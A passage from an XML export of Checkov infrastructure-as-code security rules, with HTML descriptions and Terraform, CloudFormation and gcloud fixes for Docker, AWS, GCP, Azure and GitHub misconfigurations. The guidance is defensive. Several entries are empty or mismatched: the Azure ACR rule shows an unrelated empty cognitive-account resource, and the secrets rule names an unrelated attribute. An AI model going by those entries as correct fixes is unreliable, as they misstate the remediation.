    <key>CKV_DOCKER_6</key>
    <name>Ensure that LABEL maintainer is used instead of MAINTAINER (deprecated)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="label-maintainer-is-not-used-instead-of-maintainer-deprecated"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-label-maintainer-is-not-used-instead-of-maintainer-deprecated"></div>LABEL maintainer is not used instead of MAINTAINER (deprecated)</div><a aria-label="Skip link to LABEL maintainer is not used instead of MAINTAINER (deprecated)" class="heading-anchor-icon fa fa-anchor" href="#label-maintainer-is-not-used-instead-of-maintainer-deprecated"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The LABEL instruction is much more flexible and recommended to replace the MAINTAINER (deprecated) instruction in a Dockerfile.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-label-maintainer-is-used-instead-of-maintainer-deprecated' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-label-maintainer-is-used-instead-of-maintainer-deprecated</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-label-maintainer-is-used-instead-of-maintainer-deprecated' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_183</key>
    <name>Ensure EBS Snapshot Copy is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ebs-snapshot-copy-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ebs-snapshot-copy-not-encrypted-using-customer-managed-key"></div>AWS EBS Snapshot Copy not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS EBS Snapshot Copy not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-ebs-snapshot-copy-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that the EBS Snapshot copy is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the snapshot.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ebs_snapshot_copy</li>
<li><strong>Attribute</strong>: kms_key_id - The ARN for the KMS encryption key.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ebs_snapshot_copy" "example_copy" {
  source_snapshot_id = aws_ebs_snapshot.example_snapshot.id
  source_region      = "us-west-2"
  + kms_key_id           = "ckv_kms"
  tags = {
    Name = "HelloWorld_copy_snap"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_103' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_103</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_103' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GIT_4</key>
    <name>Ensure GitHub Actions secrets are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-actions-environment-secrets-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-actions-environment-secrets-are-not-encrypted"></div>GitHub Actions Environment Secrets are not encrypted</div><a aria-label="Skip link to GitHub Actions Environment Secrets are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#github-actions-environment-secrets-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In the GitHub Terraform provider, there is an optional field to include a plaintext string of the secret. If this is checked into code, it will expose the secret.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_actions_environment_secret, github_actions_organization_secret, github_actions_secret</li>
<li>Attribute: vulnerability_alerts</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-HCL theme-light" data-lang="HCL" name="">resource "github_actions_environment_secret" "test_secret" {
...
-  plaintext_value  = "example%value"
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-actions-secrets-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-actions-secrets-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-actions-secrets-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GIT_5</key>
    <name>Ensure GitHub pull requests have at least 2 approvals</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-pull-requests-have-less-than-approvals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-pull-requests-have-less-than-approvals"></div>GitHub pull requests have less than approvals</div><a aria-label="Skip link to GitHub pull requests have less than approvals" class="heading-anchor-icon fa fa-anchor" href="#github-pull-requests-have-less-than-approvals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitHub, repository administrators can require that all pull requests receive a specific number of approving reviews before someone merges the pull request into a protected branch. It is also possible to require approving reviews from people with write permissions in the repository or from a designated code owner.</p>
<p>If a collaborator attempts to merge a pull request with pending or rejected reviews into the protected branch, the collaborator will receive an error message.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_branch_protection, github_branch_protection_v3</li>
<li>Attribute: required_approving_review_count</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-HCL theme-light" data-lang="HCL" name="">resource "github_branch_protection_v3" "example" {
...  
  required_pull_request_reviews {
+    required_approving_review_count = 2
...
  }
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals' target='_blank'> https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_99</key>
    <name>Ensure GCP Pub/Sub Topic is not anonymously or publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="pubsub-topic-is-anonymously-or-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-pub-sub-topic-is-anonymously-or-publicly-accessible"></div>Pub/Sub Topic is anonymously or publicly accessible</div><a aria-label="Skip link to Pub/Sub Topic is anonymously or publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#pubsub-topic-is-anonymously-or-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Pub/Sub is commonly used for asynchronous communication for applications in GCP. Messages are published to a <strong>Pub/Sub Topic</strong> and the ability to publish a message is controlled via IAM policies. It is possible to make <strong>Pub/Sub Topics</strong> publicly or anonymously accessible. Public notification topics can expose sensitive data and are a target for data exfiltration.</p>
<p>We recommend you ensure that neither anonymous or public access to <strong>Pub/Sub Topics</strong> is allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To remove anonymous or public access to your Pub/Sub Topic:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/cloudpubsub/topic/list" target="_self">Topics</a>.</li>
<li>Select the <em>Pub/Sub Topic checkbox</em> next to your <strong>Topic ID</strong>.</li>
<li>Select the <strong>INFO PANEL</strong> tab to view the topic's permissions.</li>
<li>To remove a specific role assignment, select <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong>, and then click <strong>Delete</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove access to <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, you need to first get the <strong>Pub/Sub Topic's</strong> existing IAM policy. To retrieve the existing policy and copy it to a local file:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud pubsub topics get-iam-policy \
   projects/PROJECT/topics/TOPIC \
   --format json &gt; topic_policy.json
</code></pre></div></div>
<p>Replace <strong>PROJECT</strong> with the project ID where your Pub/Sub Topic is located. Replace <strong>TOPIC</strong> with the Pub/Sub Topic ID.</p>
<p>Next, locate and remove the IAM bindings with either <strong>allUsers</strong> or <strong>allAuthenticatedUsers</strong> depending on your Checkov error. After modifying the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">topic_policy.json</code> file, update Pub/Sub Topic with the following command:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud pubsub topics set-iam-policy  \
   projects/PROJECT/topics/TOPIC  \
   topic_policy.json
</code></pre></div></div>
<p>Replace <strong>PROJECT</strong> with the project ID where your Pub/Sub Topic is located. Replace <strong>TOPIC</strong> with the Pub/Sub Topic ID.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_pubsub_topic_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
<li>
<p><strong>Resource</strong>: google_pubsub_topic_iam_member</p>
</li>
<li>
<p><strong>Field</strong>: member</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_pubsub_topic_iam_binding" "public_binding" {
  topic = google_pubsub_topic.example.name
  role = "roles/pubsub.publisher"

  members = [
-    "allUsers",
-    "allAuthenticatedUsers",
  ]
}
</code></pre></div></div>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_pubsub_topic_iam_member" "public_member" {
  topic = google_pubsub_topic.example.name
  role = "roles/pubsub.publisher"

-  member = "allUsers"
-  member = "allAuthenticatedUsers"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topic-is-not-anonymously-or-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topic-is-not-anonymously-or-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-pubsub-topic-is-not-anonymously-or-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_260</key>
    <name>Ensure AWS security groups do not allow ingress from 0.0.0.0/0 to port 80</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-security-groups-allow-ingress-from-00000-to-port-80"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-security-groups-allow-ingress-from-0-0-0-0-0-to-port-80"></div>AWS security groups allow ingress from 0.0.0.0/0 to port 80</div><a aria-label="Skip link to AWS security groups allow ingress from 0.0.0.0/0 to port 80" class="heading-anchor-icon fa fa-anchor" href="#aws-security-groups-allow-ingress-from-00000-to-port-80"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-security-groups-do-not-allow-ingress-from-00000-to-port-80' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-security-groups-do-not-allow-ingress-from-00000-to-port-80</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-security-groups-do-not-allow-ingress-from-00000-to-port-80' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_142</key>
    <name>Ensure Azure Machine Learning Compute Cluster Local Authentication is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-machine-learning-compute-cluster-local-authentication-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-machine-learning-compute-cluster-local-authentication-is-enabled"></div>Azure Machine Learning Compute Cluster Local Authentication is enabled</div><a aria-label="Skip link to Azure Machine Learning Compute Cluster Local Authentication is enabled" class="heading-anchor-icon fa fa-anchor" href="#azure-machine-learning-compute-cluster-local-authentication-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_role_definition</li>
<li><strong>Argument</strong>: actions</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_role_definition" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-local-authentication-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-local-authentication-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-machine-learning-compute-cluster-local-authentication-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_229</key>
    <name>Ensure AWS NACL does not allow ingress from 0.0.0.0/0 to port 21</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-nacl-allows-ingress-from-00000-to-port-21"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-nacl-allows-ingress-from-0-0-0-0-0-to-port-21"></div>AWS NACL allows ingress from 0.0.0.0/0 to port 21</div><a aria-label="Skip link to AWS NACL allows ingress from 0.0.0.0/0 to port 21" class="heading-anchor-icon fa fa-anchor" href="#aws-nacl-allows-ingress-from-00000-to-port-21"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Network Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 21. Removing unfettered connectivity to remote console services, such as FTP, reduces a server's exposure to risk.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:  
  InboundRule:
    Type: AWS::EC2::NetworkAclEntry
    Properties:
       NetworkAclId:
         Ref: MyNACL
       RuleNumber: 200
       Protocol: 6
       RuleAction: allow
-      CidrBlock: 0.0.0.0/0
+      CidrBlock: 10.0.0.0/32
       PortRange:
         From: 21
         To: 21
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_network_acl_rule" "example" {
  network_acl_id = aws_network_acl.example.id
  rule_number    = 200
  egress         = false
  protocol       = "tcp"
  rule_action    = "allow"
- cidr_block     = "0.0.0.0/0"
+ cidr_block     = "10.0.0.0/32"
  from_port      = 21
  to_port        = 21
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-21' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-21</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-21' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_11</key>
    <name>Ensure Docker From alias is unique for multistage builds</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="docker-from-alias-is-not-unique-for-multistage-builds"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-docker-from-alias-is-not-unique-for-multistage-builds"></div>Docker From alias is not unique for multistage builds</div><a aria-label="Skip link to Docker From alias is not unique for multistage builds" class="heading-anchor-icon fa fa-anchor" href="#docker-from-alias-is-not-unique-for-multistage-builds"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-docker-from-alias-is-unique-for-multistage-builds' target='_blank'> https://docs.bridgecrew.io/docs/ensure-docker-from-alias-is-unique-for-multistage-builds</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-docker-from-alias-is-unique-for-multistage-builds' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_139</key>
    <name>Ensure Azure ACR is set to disable public networking</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-acr-is-set-to-enable-public-networking"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-acr-is-set-to-enable-public-networking"></div>Azure ACR is set to enable public networking</div><a aria-label="Skip link to Azure ACR is set to enable public networking" class="heading-anchor-icon fa fa-anchor" href="#azure-acr-is-set-to-enable-public-networking"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {

}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-acr-is-set-to-disable-public-networking' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-acr-is-set-to-disable-public-networking</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-acr-is-set-to-disable-public-networking' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_83</key>
    <name>Ensure GCP Pub/Sub Topics are encrypted with Customer Supplied Encryption Keys (CSEK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-pubsub-topics-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-pub-sub-topics-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div>GCP Pub/Sub Topics are not encrypted with Customer Supplied Encryption Keys (CSEK)</div><a aria-label="Skip link to GCP Pub/Sub Topics are not encrypted with Customer Supplied Encryption Keys (CSEK)" class="heading-anchor-icon fa fa-anchor" href="#gcp-pubsub-topics-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></a></h1>
